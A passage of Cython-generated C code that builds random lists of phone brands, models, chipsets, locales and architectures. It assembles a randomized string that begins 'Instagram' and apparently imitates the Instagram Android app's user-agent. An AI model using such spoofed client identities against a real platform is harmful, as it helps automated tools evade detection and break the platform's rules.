  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_SM_G973F);
  __Pyx_INCREF(__pyx_kp_u_SM_A515F);
  __Pyx_GIVEREF(__pyx_kp_u_SM_A515F);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_kp_u_SM_A515F);
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_samsung, __pyx_t_2) < 0) __PYX_ERR(0, 372, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 373, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_Pixel_4);
  __Pyx_GIVEREF(__pyx_kp_u_Pixel_4);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_Pixel_4);
  __Pyx_INCREF(__pyx_kp_u_Pixel_5);
  __Pyx_GIVEREF(__pyx_kp_u_Pixel_5);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_Pixel_5);
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_google, __pyx_t_2) < 0) __PYX_ERR(0, 372, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 374, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_P30_Pro);
  __Pyx_GIVEREF(__pyx_kp_u_P30_Pro);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_P30_Pro);
  __Pyx_INCREF(__pyx_kp_u_Mate_40_Pro);
  __Pyx_GIVEREF(__pyx_kp_u_Mate_40_Pro);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_Mate_40_Pro);
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_huawei, __pyx_t_2) < 0) __PYX_ERR(0, 372, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 375, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_Mi_10);
  __Pyx_GIVEREF(__pyx_kp_u_Mi_10);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_Mi_10);
  __Pyx_INCREF(__pyx_kp_u_Redmi_Note_10);
  __Pyx_GIVEREF(__pyx_kp_u_Redmi_Note_10);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_Redmi_Note_10);
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_xiaomi, __pyx_t_2) < 0) __PYX_ERR(0, 372, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 376, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_8T);
  __Pyx_GIVEREF(__pyx_kp_u_8T);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_8T);
  __Pyx_INCREF(__pyx_kp_u_9_Pro);
  __Pyx_GIVEREF(__pyx_kp_u_9_Pro);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_9_Pro);
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_oneplus, __pyx_t_2) < 0) __PYX_ERR(0, 372, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 377, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_u_XZ2);
  __Pyx_GIVEREF(__pyx_n_u_XZ2);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_u_XZ2);
  __Pyx_INCREF(__pyx_kp_u_Xperia_1);
  __Pyx_GIVEREF(__pyx_kp_u_Xperia_1);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_Xperia_1);
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_sony, __pyx_t_2) < 0) __PYX_ERR(0, 372, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_dd = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 378, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_u_qcom);
  __Pyx_GIVEREF(__pyx_n_u_qcom);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_u_qcom);
  __Pyx_INCREF(__pyx_n_u_exynos);
  __Pyx_GIVEREF(__pyx_n_u_exynos);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_n_u_exynos);
  __Pyx_INCREF(__pyx_n_u_kirin);
  __Pyx_GIVEREF(__pyx_n_u_kirin);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_n_u_kirin);
  __Pyx_INCREF(__pyx_n_u_mediatek);
  __Pyx_GIVEREF(__pyx_n_u_mediatek);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_n_u_mediatek);
  __Pyx_INCREF(__pyx_n_u_apple);
  __Pyx_GIVEREF(__pyx_n_u_apple);
  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_n_u_apple);
  __pyx_v_cc = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 379, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_u_en_US);
  __Pyx_GIVEREF(__pyx_n_u_en_US);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_u_en_US);
  __Pyx_INCREF(__pyx_n_u_es_ES);
  __Pyx_GIVEREF(__pyx_n_u_es_ES);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_n_u_es_ES);
  __Pyx_INCREF(__pyx_n_u_fr_FR);
  __Pyx_GIVEREF(__pyx_n_u_fr_FR);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_n_u_fr_FR);
  __Pyx_INCREF(__pyx_n_u_de_DE);
  __Pyx_GIVEREF(__pyx_n_u_de_DE);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_n_u_de_DE);
  __Pyx_INCREF(__pyx_n_u_zh_CN);
  __Pyx_GIVEREF(__pyx_n_u_zh_CN);
  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_n_u_zh_CN);
  __Pyx_INCREF(__pyx_n_u_ja_JP);
  __Pyx_GIVEREF(__pyx_n_u_ja_JP);
  PyList_SET_ITEM(__pyx_t_1, 5, __pyx_n_u_ja_JP);
  __Pyx_INCREF(__pyx_n_u_ko_KR);
  __Pyx_GIVEREF(__pyx_n_u_ko_KR);
  PyList_SET_ITEM(__pyx_t_1, 6, __pyx_n_u_ko_KR);
  __pyx_v_lan = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 380, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_u_phone);
  __Pyx_GIVEREF(__pyx_n_u_phone);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_u_phone);
  __Pyx_INCREF(__pyx_n_u_tablet);
  __Pyx_GIVEREF(__pyx_n_u_tablet);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_n_u_tablet);
  __Pyx_INCREF(__pyx_n_u_watch);
  __Pyx_GIVEREF(__pyx_n_u_watch);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_n_u_watch);
  __Pyx_INCREF(__pyx_n_u_tv);
  __Pyx_GIVEREF(__pyx_n_u_tv);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_n_u_tv);
  __Pyx_INCREF(__pyx_n_u_car);
  __Pyx_GIVEREF(__pyx_n_u_car);
  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_n_u_car);
  __pyx_v_dp = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 381, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_u_arm64_v8a);
  __Pyx_GIVEREF(__pyx_n_u_arm64_v8a);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_u_arm64_v8a);
  __Pyx_INCREF(__pyx_kp_u_armeabi_v7a);
  __Pyx_GIVEREF(__pyx_kp_u_armeabi_v7a);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_kp_u_armeabi_v7a);
  __Pyx_INCREF(__pyx_n_u_x86);
  __Pyx_GIVEREF(__pyx_n_u_x86);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_n_u_x86);
  __Pyx_INCREF(__pyx_n_u_x86_64);
  __Pyx_GIVEREF(__pyx_n_u_x86_64);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_n_u_x86_64);
  __pyx_v_arm = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 382, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_u_samsung);
  __Pyx_GIVEREF(__pyx_n_u_samsung);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_u_samsung);
  __Pyx_INCREF(__pyx_n_u_google);
  __Pyx_GIVEREF(__pyx_n_u_google);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_n_u_google);
  __Pyx_INCREF(__pyx_n_u_huawei);
  __Pyx_GIVEREF(__pyx_n_u_huawei);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_n_u_huawei);
  __Pyx_INCREF(__pyx_n_u_xiaomi);
  __Pyx_GIVEREF(__pyx_n_u_xiaomi);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_n_u_xiaomi);
  __Pyx_INCREF(__pyx_n_u_oneplus);
  __Pyx_GIVEREF(__pyx_n_u_oneplus);
  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_n_u_oneplus);
  __Pyx_INCREF(__pyx_n_u_sony);
  __Pyx_GIVEREF(__pyx_n_u_sony);
  PyList_SET_ITEM(__pyx_t_1, 5, __pyx_n_u_sony);
  __pyx_v_comb = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 383, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 383, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyDict_Keys(__pyx_v_aa); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 385, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_4 = PySequence_List(__pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 384, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_2, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 383, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_sos = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 385, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 385, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_PyDict_GetItem(__pyx_v_aa, __pyx_v_sos); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 386, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_3);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 385, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_v_vlo = __pyx_t_1;
  __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 386, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 386, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  
  __pyx_t_4 = __Pyx_PyDict_GetItem(__pyx_v_ss, __pyx_v_vlo); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 387, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_2, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 386, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_lop = __pyx_t_1;
  __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 387, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 387, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_3, __pyx_v_comb) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_v_comb);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 387, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_v_ki = __pyx_t_1;
  __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 387, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 387, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  
  __pyx_t_4 = PyList_New(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_INCREF(__pyx_n_u_Unknown);
  __Pyx_GIVEREF(__pyx_n_u_Unknown);
  PyList_SET_ITEM(__pyx_t_4, 0, __pyx_n_u_Unknown);

  
  __pyx_t_2 = __Pyx_PyDict_GetItemDefault(__pyx_v_dd, __pyx_v_ki, __pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 388, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 387, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_mo = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __pyx_t_1 = PyTuple_New(21); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_5 = 0;
  __pyx_t_6 = 127;
  __Pyx_INCREF(__pyx_kp_u_Instagram);
  __pyx_t_5 += 10;
  __Pyx_GIVEREF(__pyx_kp_u_Instagram);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u_Instagram);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_3 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_2, __pyx_v_ii) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_v_ii);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_6 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_6) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_6;
  __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_Android_2);
  __pyx_t_5 += 10;
  __Pyx_GIVEREF(__pyx_kp_u_Android_2);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u_Android_2);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_sos, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_6) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_6;
  __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u__36);
  __pyx_t_5 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__36);
  PyTuple_SET_ITEM(__pyx_t_1, 4, __pyx_kp_u__36);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_vlo, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_6) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_6;
  __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_1, 5, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u__36);
  __pyx_t_5 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__36);
  PyTuple_SET_ITEM(__pyx_t_1, 6, __pyx_kp_u__36);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_lop, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_6) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_6;
  __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_1, 7, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u__36);
  __pyx_t_5 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__36);
  PyTuple_SET_ITEM(__pyx_t_1, 8, __pyx_kp_u__36);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_ki, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_6) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_6;
  __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_1, 9, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u__36);
  __pyx_t_5 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__36);
  PyTuple_SET_ITEM(__pyx_t_1, 10, __pyx_kp_u__36);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_mo, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_6) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_6;
  __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_1, 11, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u__36);
  __pyx_t_5 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__36);
  PyTuple_SET_ITEM(__pyx_t_1, 12, __pyx_kp_u__36);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_4 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_3, __pyx_v_arm) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_v_arm);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_6 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_6) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_6;
  __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
